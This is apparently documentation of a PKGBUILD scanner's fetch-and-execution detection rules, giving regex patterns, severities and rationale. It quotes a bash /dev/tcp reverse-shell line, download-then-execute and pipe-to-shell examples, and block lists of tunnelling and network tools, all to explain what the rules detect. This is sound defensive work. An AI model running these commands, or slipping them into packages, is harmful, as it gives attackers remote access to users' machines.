<!-- description: Rules claiming that something was fetched, something was executed, or a path connects the two. The densest group in the ruleset. -->

# Fetch and Execution

Code reaches the machine and runs. Every rule here claims one of three
things: something was fetched, something was executed, or a path connects
the two. They are the densest group in the ruleset because the shapes are
many and the claim is the same one, so a rule that only covers `curl |
bash` leaves the rest of the family open.

The pipe-to-shell rules (R001, R002) are the canonical form. H075, H082 and
H083 exist because the pipe is not required: process substitution, a
download split across two lines, and a declared `source=()` script all put
fetched code in a shell without one. H077 moves the same question to parse
time, where the fetch happens before any build step or checksum applies.

See [the rule system reference](system.md) for the field table, the
severity weights and the reserved identifier ranges.

---

<!-- generated: page-index -->
## Rules on this page

| Rule | Name | Severity |
|---|---|---|
| [C007](#c007) | Command Substitution In Source Array | CRITICAL |
| [H003](#h003) | Insecure Download Protocol | LOW |
| [H004](#h004) | Privilege Escalation | CRITICAL |
| [H009](#h009) | Network connection attempt | CRITICAL |
| [H011](#h011) | Sensitive binary execution | HIGH |
| [H015](#h015) | Critical Build Function Modified | INFO |
| [H016](#h016) | Hidden Network Fetch In Build | HIGH |
| [H031](#h031) | Version-In-URL Injection | MEDIUM |
| [H034](#h034) | Exotic Source Protocol | MEDIUM |
| [H041](#h041) | Upload To Paste Or File-Drop Host | HIGH |
| [H068](#h068) | Reconstructed Executable Payload | HIGH |
| [H069](#h069) | Build-time Generation Then Execution | HIGH |
| [H071](#h071) | Covert Egress | HIGH |
| [H072](#h072) | Write Then Execute | HIGH |
| [H075](#h075) | Indirect Remote Execution | CRITICAL |
| [H077](#h077) | Parse-time Network Fetch | HIGH |
| [H081](#h081) | Committed File Executed Without Declaration | HIGH |
| [H082](#h082) | Fetch Then Execute | CRITICAL |
| [H083](#h083) | Downloaded Source File Executed | HIGH |
| [H090](#h090) | Committed Companion Carries A Fetch-Execute Payload | CRITICAL |
| [H094](#h094) | Unread Script Executed During Packaging | HIGH |
| [R001](#r001) | Remote Script Execution | CRITICAL |
| [R002](#r002) | Wget Pipe to Shell | CRITICAL |
| [R008](#r008) | Unexpected File Download | HIGH |
| [R010](#r010) | Uses curl in PKGBUILD | LOW |
| [R011](#r011) | Uses wget in PKGBUILD | LOW |
| [R041](#r041) | Shell Network Redirection | CRITICAL |
| [R042](#r042) | Download Then Execute | CRITICAL |
| [R044](#r044) | Interpreter One-Liner With Network | HIGH |
| [R046](#r046) | Source URL Uses IP Address | MEDIUM |
| [R047](#r047) | Source URL Uses Non-Standard Port | LOW |
| [R048](#r048) | Source URL On Free Registrar TLD | LOW |
| [R051](#r051) | Network Access In pkgver | HIGH |
| [R055](#r055) | Git Clone With Variable Branch | MEDIUM |
| [R056](#r056) | Download Then Source | CRITICAL |
| [R057](#r057) | TLS Verification Disabled | HIGH |
<!-- /generated: page-index -->

### R001: Remote Script Execution {#r001}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `curl.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
- **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.
- **Note:** The lookbehind requires the pipe to be **unescaped**. `curl x \| sh` passes a literal bar to `curl` as an argument and starts no pipeline, so it is not a match. The tokenizer preserves the escape (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. A `rules.toml` written by an earlier release may hold a wider pattern that does match it; [`trustsight config sync-rules --update`](../cli.md#sync-rules) replaces patterns this project shipped previously.

### R002: Wget Pipe to Shell {#r002}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `wget.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
- **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.
- **Note:** The pipe must be **unescaped**. An escaped bar is an argument to the command and starts no pipeline, so it is not a match. The tokenizer preserves the escape (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. A `rules.toml` written by an earlier release may hold a wider pattern that does match it; [`trustsight config sync-rules --update`](../cli.md#sync-rules) replaces patterns this project shipped previously.

### H003: Insecure Download Protocol {#h003}

- **Target:** programmatic (diff-aware)
- **Severity:** LOW (weight 5)
- **Category:** `integrity`
- **Condition:** An added `http://` source URL has no added or changed checksum array.
- **Description:** Plain HTTP permits a network attacker to replace a download in transit. Adding a checksum in the same diff supplies checksum backing and suppresses this rule; `sha256sums=('SKIP')` does not. The rule is intentionally about transport without newly declared integrity backing, not about pipes or archive suffixes.

### R008: Unexpected File Download {#r008}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(python|ruby|perl)\s+-c\s+https?://`
- **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.

### H004: Privilege Escalation {#h004}

- **Target:** `raw_line`
- **Severity:** CRITICAL (weight 40)
- **Category:** `privilege`
- **Pattern:** `\bsudo\b`
- **Scope:** `["function_body"]` only
- **Description:** Detects `sudo` inside function bodies. Does not fire in comments, plain messages (`echo`, `printf`, `note`), or top-level declarations. Scope restriction prevents false positives from `groups=('sudo')` or `echo "sudo required"`. It *does* fire on `echo "x"; sudo ...`, since a message followed by a separator is an execution context.

### R010: Uses curl in PKGBUILD {#r010}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bcurl\s`
- **Scope:** `["function_body"]` only
- **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.

### R011: Uses wget in PKGBUILD {#r011}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bwget\s`
- **Scope:** `["function_body"]` only
- **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.

### H009: Network connection attempt {#h009}

- **Target:** `runtime` (resolved execution path)
- **Severity:** CRITICAL (weight 40)
- **Category:** `network`
- **Pattern:** `(?!)` (never matches)
- **Description:** A network socket opening at execution time. Shipped with a never-matching placeholder pattern because the current model cannot observe post-install behaviour from a static diff; the identifier is reserved so a future runtime probe can emit it without a baseline change.

### H011: Sensitive binary execution {#h011}

- **Target:** `runtime` (resolved execution path)
- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Pattern:** `(?!)` (never matches)
- **Description:** Execution of a sensitive binary in an unexpected position. Reserved `never-match` placeholder, as H009/H010.

### C007: Command Substitution In Source Array {#c007}

- **Severity:** CRITICAL (weight 40)
- **Condition:** An added `source=()` line contains `$(...)` or a backtick expression.
- **Description:** The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.

### R041: Shell Network Redirection {#r041}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `/dev/(?:tcp|udp)/|/dev/[a-z]*[?*\[][a-z?*\]\[]*/|/dev/\$\{?\w+\}?/`
- **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.

### R042: Download Then Execute {#r042}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:chmod\s+\+x[^;&|]*(?:&&|;)\s*)?(?:\./|/tmp/|bash\s|sh\s)`
- **Description:** Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.

### R044: Interpreter One-Liner With Network {#r044}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(?:python3?|perl|ruby)\s+-e\s+.*(?:socket|urllib|urlopen|Net::|LWP|open-uri|https?://)`
- **Description:** Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.

### R046: Source URL Uses IP Address {#r046}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Pattern:** `https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
- **Description:** A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply.

### R047: Source URL Uses Non-Standard Port {#r047}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s:]+:(?!(?:80|443|8080|8443)(?:[/\s"\x27]|$))\d{2,5}`
- **Description:** A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host.

### R048: Source URL On Free Registrar TLD {#r048}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s]*\.(?:tk|ml|ga|cf|gq|pw)(?:[:/]|["\x27\s)]|$)`
- **Description:** A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.

### R051: Network Access In pkgver {#r051}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `packaging`
- **Scope:** `['pkgver']`
- **Pattern:** `\b(?:curl|wget2?|aria2c|axel|lftp|ncftp(?:get)?|snarf|httpie|elinks|links2?|w3m|lynx|browsh|scp|sftp|rsync|ftp|tftp|ssh(?=\s+(?:-\S+\s+)*[\w.@-]+\s+\S)|nc|ncat|netcat|socat|telnet|openssl\s+s_client|dig|host|nslookup|drill|kdig|git\s+(?:clone|fetch|pull|ls-remote|archive)|svn\s+(?:co|checkout|export)|hg\s+(?:clone|pull|unbundle)|bzr\s+(?:branch|pull|export)|darcs\s+get|fossil\s+clone|cvs\s+(?:[-:]\S+\s+)*(?:co|checkout|export)|s3cmd\s+(?:get|sync|cp)|aws\s+s3\s+(?:cp|sync|mv)|gsutil\s+(?:cp|rsync)|az(?:copy)?\s+(?:storage\s+blob\s+download|copy)|rclone\s+(?:copy|sync|cat|copyto)|ipfs\s+(?:get|cat|dag\s+get)|swift\s+download|rados\s+get|git\s+lfs\s+(?:pull|fetch|checkout)|yt-dlp|youtube-dl|transmission-cli|aria2c(?=\s+[^\n;&|]*magnet:)|b2\s+download-file|restic\s+restore|borg\s+extract|lwp-request|lwp-download|git\s+push|fetch(?=\s+[^\n;&|]*\b(?:https?|ftps?)://))\b`
- **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.

### R055: Git Clone With Variable Branch {#r055}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Pattern:** `git\s+clone\s+[^;&|]*(?:--branch|-b)\s+\$\{?[a-zA-Z_]`
- **Description:** A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.

### R056: Download Then Source {#r056}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:source|\.)\s`
- **Description:** Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.

### R057: TLS Verification Disabled {#r057}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Pattern:** `(?:curl\s+(?:[^;&|]*\s)?(?:--insecure|-k)\b|wget\s+(?:[^;&|]*\s)?--no-check-certificate\b)`
- **Description:** Detects `curl --insecure` / `curl -k` and `wget --no-check-certificate`. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it.

### H015: Critical Build Function Modified {#h015}

- **Target:** programmatic (diff-aware, defined in `src/trustsight/analysis/build.py`)
- **Severity:** INFO (weight 0)
- **Category:** `build`
- **Description:** The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.

**INFO, so it contributes nothing to the score.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also rewrites `build()`" case the rule was first proposed for is 9.8 %. Carrying weight it would simply add points to one benign update in five.

At weight 0 it is context for a reviewer rather than a signal, which is why it is the one rule in this group that is **on by default**.

Function membership comes from `_classify_enclosing_function()` in `rules.py`, **not** from the `@@` hunk header. The calibration corpus is generated with `git diff -W` and a custom `xfuncname`, so its hunk headers name the enclosing function, while the live pygit2 path emits none. A rule tuned on hunk headers would be calibrated against data production never produces.

On by default. See [`[experimental_rules]`](../configuration.md#experimental_rules).

### H016: Hidden Network Fetch In Build {#h016}

- **Target:** programmatic (resolved command lines)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Description:** A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.

The comparison is against a **source-array-scoped** URL extraction, not the general `extract_urls_from_diff()`. That helper collects URLs from any added line, including the offending `curl` line itself, so comparing against it would mean the rule could never fire. A fetch of a URL already declared in `source=()` does not fire.

On by default. See [`[experimental_rules]`](../configuration.md#experimental_rules).

### H031: Version-In-URL Injection {#h031}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Condition:** `pkgver` or `_pkgver` is assigned a literal containing characters outside `[A-Za-z0-9._+-]`, and that variable is interpolated (braced or bare) into a source URL.

Both halves are required. An unsafe version string that is never interpolated
stays quiet, and an interpolated version made only of version characters is
ordinary packaging. What the rule describes is a value carrying delimiters
(`;`, whitespace, `/`) being substituted into something the build fetches.

Fire rate: 0 on all 3246 benign-corpus diffs.

### H034: Exotic Source Protocol {#h034}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Condition:** A `source=` entry uses a scheme outside the `[hosts] source_schemes` allowlist. The base of a `transport+base` token is what is judged, so `git+https://` is read as `https`.

`data:` URIs carry no `://` and are not scheme tokens, which is an accepted
gap rather than a silent pass.

Fire rate: 6 of 3246 (0.18 %).

### H041: Upload To Paste Or File-Drop Host {#h041}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `exfil`
- **Condition:** A build or install function invokes `curl`/`wget` with a request body (an upload flag from `[patterns] upload_flags`) against a host in `[hosts] paste_hosts`.

Direction is the entire rule. The same host list also feeds the
`raw_hosting` source bucket, so a paste host in `source=()` is already carried
at +15 and a rule that fired on it would double-count that weight. What no
bucket can see is the other direction: a request leaving a build with a body
attached, addressed to a host whose purpose is to accept an anonymous drop and
hand back a link.

Fetching from one of these hosts is not this rule. A `curl` pulling a patch
from a gist is an undeclared download, which H016 already reports. Posting to
that same gist is data leaving the machine that is building the package, and it
is the evidence behind H043's `exfil` stage. On a line H041 claims, H016 stands
down: describing an upload as a download would be wrong as well as scored
twice.

The destination is an auditable list rather than a guess about what an endpoint
is for, so an upload to a project's own CI host does not fire.

Fire rate: 0 of 3246. The corpus contains one paste-host reference, a gist
download in `gamescope-nvidia`, which stays H016's.

### H071: Covert Egress {#h071}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Condition:** An added line references a `.onion`/`.i2p` host, issues a DNS-over-HTTPS query or names a configured DoH endpoint, or invokes a tunnelling client (`torsocks`, `socat`, `ngrok`, `chisel`, `frpc`, ...) at a command position inside a build or install function.

The command-position anchor is what separates use from mention: a client named
in a string or listed in `makedepends` never fires.

Fire rate: 0 of 3246.

### H077: Parse-time Network Fetch {#h077}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Condition:** A network client from `[patterns] parse_time_fetch` runs at a command position **outside every function**, in the PKGBUILD or an install file.

Everything at the top level executes as soon as makepkg sources the recipe,
which happens on `makepkg --printsrcinfo`, on an AUR helper's metadata refresh,
and on anything else that reads the file. That is before a build step runs and
before the checksum array covers anything. R010 and R011 report a downloader
inside a build function at LOW; running one at parse time is a different claim,
so it is a different rule.

Quiet by construction on declarations: `DLAGENTS=(...)` and any other
assignment whose *value* merely names a downloader configures makepkg rather
than fetching. An assignment that *runs* one through a command substitution
(`_ver=$(curl ...)`) is not a declaration and is not exempt. A fetch piped
straight into a shell belongs to R001/R002, whose claim is heavier, so H077
yields rather than scoring the same line twice.

Fire rate: 3 of 3246 (0.09 %), all one package resolving a redirect with
`curl` at the top level, which really does reach the network on a metadata
refresh.

### H068: Reconstructed Executable Payload {#h068}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** Text on an added line (base64, hex, uuencode, or an H065 reconstruction) decodes to bytes carrying ELF, shebang, PE or Mach-O magic.

This is a type check on the decoder's output, which is why one rule covers
every encoded-payload variant without naming the encoding. Encoded text assets,
checksums and keys decode to none of those magics.

Fire rate: 0 of 3246.

### H069: Build-time Generation Then Execution {#h069}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** A heredoc, `printf` or `cat >` writes a script or source file that the same function then compiles or executes.

Writing a config file, a `.desktop` entry or a patch that a declared build step
consumes is not generation-then-execution and does not fire.

Fire rate: 0 of 3246.

### H072: Write Then Execute {#h072}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** A path the recipe writes is then executed by the same function.

The execution side counts interpreters, `source`, `.`, compilers and a plain
absolute path at a command position, with or without arguments. Files that
arrived through a declared `source=` and the project's own configure/make
artefacts are exempt.

Fire rate: 0 of 3246.

### H075: Indirect Remote Execution {#h075}

- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Condition:** A fetched script reaches a shell by a path the pipe-to-shell rules do not see: process substitution (`bash <(curl ...)`), `xargs` (`curl ... | xargs bash`), or a here-string fed by command substitution (`bash <<< "$(curl ...)"`).

Each still executes remote code at build time, so it belongs with R001/R002
rather than at R010/R011's "uses curl" LOW.

### H081: Committed File Executed Without Declaration {#h081}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** An executed path is not a declared `source=()` basename, not a file the recipe wrote earlier in the same function, and not an H072-exempt build artifact, and either the path references `${startdir}`/`$startdir` or walks `../`, or the executed basename is present in the repository tree manifest under a relative path. A build tool (`make`, `cmake`, `ninja`, `meson`) whose *implicit* input file is in the manifest and undeclared counts as executing it.

H069/H072 own files the recipe itself writes; H066 owns committed ELF
binaries. Between them sat the cleartext helper script: committed to the AUR
repository, never named in `source=()` (so makepkg never copies it into
`$srcdir` and its bytes never reach the differ), and executed through
`$startdir` or a `../` climb. Two signals, either sufficient: the `$startdir`
or `../` path reference (available even without a manifest), or the basename
in the tree manifest (only when a manifest was supplied - without one the rule
never guesses). An absolute `/usr/share/...` target cannot be a repository
file, however its basename collides, so the manifest signal requires a
relative path.

A build tool names no file on the command line, so no execution pattern saw
one, and `make` sits in H072's benign-artifact exemption because almost every
package runs it. The question is not the command but the file it reads: a
`Makefile` committed to the AUR repository and absent from `source=()` is code
with no checksum over it and nothing declaring it. The rule therefore resolves
the implicit input of `make`/`gmake` (`GNUmakefile`, `makefile`, `Makefile`),
`cmake` (`CMakeLists.txt`), `ninja` (`build.ninja`) and `meson`
(`meson.build`), and fires only when that file is in the manifest and
undeclared. A `-f` or `-C` flag names the input explicitly and is left to the
ordinary execution patterns. All 14 diffs in the locked benign corpus that
commit a build file declare it in `source=()`, so the arm fires on none of
them. Detected by `_committed_execution_findings()` in
`src/trustsight/analysis/delivery.py`.

### H082: Fetch Then Execute {#h082}

- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Condition:** Inside a build/package/check/prepare function (install hooks already have H017), a line downloads to a file with `curl`/`wget`/`aria2c`/`axel` (`-o`, `--output`, `--output-document`, or `>` form) or with an interpreter one-liner (`python3 -c ... urlretrieve`, `perl -e ... getstore`, and the rest), and the same scope later executes that file. "The same scope" follows the call graph: a fetch in a helper and the execution in the `build()` that calls it are one operation.

This is `curl -o stage.sh ... ; bash stage.sh` split across lines so the
pipe-to-shell regex (R001/R002) never sees the `|`. Files that arrived via
the declared `source=()` array are deliberately excluded - they have their
own rule (H083), so checksum-bearing source files are not double-counted.

The client list is not only `curl` and `wget`, because those are what a
reviewer greps for: an interpreter that is already a makedepend fetches just
as well, and `python3 -c 'import urllib.request;
urllib.request.urlretrieve(url, "x.sh")'` writes a file the next line can run.
The fetch and the execution are matched by *scope* rather than by enclosing
function name, so splitting them across helpers does not separate them.
Detected by `_fetch_then_execute_findings()` in
`src/trustsight/analysis/delivery.py`.

### H083: Downloaded Source File Executed {#h083}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** An interpreter (`bash`/`sh`/`zsh`/`dash`/`ksh`/`python`/`perl`/`ruby`), `source`, `.` or `./` form executes a file whose basename is declared in the `source=()` array.

Checksums protect integrity, not intent: a `source=(... .sh)` followed by
`bash "$srcdir/that.sh"` is remote code execution just like `curl | bash`,
only hidden behind the ordinary download path. Build-system scripts
(`configure`, `make`, `meson`, `ninja`, `cmake`) are common declared-source
executables and stay silent; the rule targets interpreted execution of a
downloaded script. Detected by `_source_file_execution_findings()` in
`src/trustsight/analysis/delivery.py`.

### H090: Committed Companion Carries A Fetch-Execute Payload {#h090}

- **Severity:** CRITICAL (weight 40)
- **Category:** `delivery`
- **Condition:** A committed `.service`, `.socket`, `.timer`, `.path`,
  `.desktop`, `.rules`, `.conf`, `.install`, `.hook`, `.patch` or `.diff`
  whose content pipes a network fetch into an executor - or, for a patch,
  whose *added* lines do.

A `.service` whose `ExecStart=` pipes a download into a shell is the
payload, and until now nothing read it. The diff shows the recipe staging
the file, which is ordinary packaging and scored as such; the bytes that
matter live in a file the diff does not touch.

That split is available to an attacker as a schedule. Commit the unit in one
push, where it is a file nobody runs. Add the `install` line in a later one,
where the reviewer sees a single unremarkable line. Neither push contains an
attack; both together do.

The rule reads the committed file instead of inferring from the recipe. What
it looks for is deliberately narrow - a network fetch whose output reaches
an executor - because that is not something a unit file, a desktop entry or
a udev rule in a package repository does for a legitimate reason. A patch is
read by its added lines only: a hunk that *removes* a `curl … | sh` is the
opposite of this rule's subject.

Reading the content at all required a change underneath it. The tree
manifest kept 64 bytes per file, which answers "is this an ELF" - all H066
ever asked - and cannot answer "what does this unit run". Files whose names
say a recipe can ship or apply them are now read to 16 KiB, with a 512 KiB
ceiling across the whole tree, and a companion cut short by either bound
marks the tree incomplete rather than reporting a full examination of a
partial read.

### H094: Unread Script Executed During Packaging {#h094}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** The W001 observable - a script neither declared nor
  committed - executed inside `package()` or an install hook.

`package()` stages files into `$pkgdir`. It is not where software gets
built, and its output *is* the package. Running an unaudited script there
is a different act from running one in `build()`.

This is the scoring half of [W001](unverifiable.md#w001), and the split is
measured rather than assumed: of the three benign corpus diffs that execute
a script from the unpacked tree, two are in `build()` and one in
`prepare()`. None is in `package()`. So W001 keeps weight 0 over the
surface where the behaviour is ordinary, and the subset that is not
ordinary is scored.

Zero occurrences in the benign corpus.
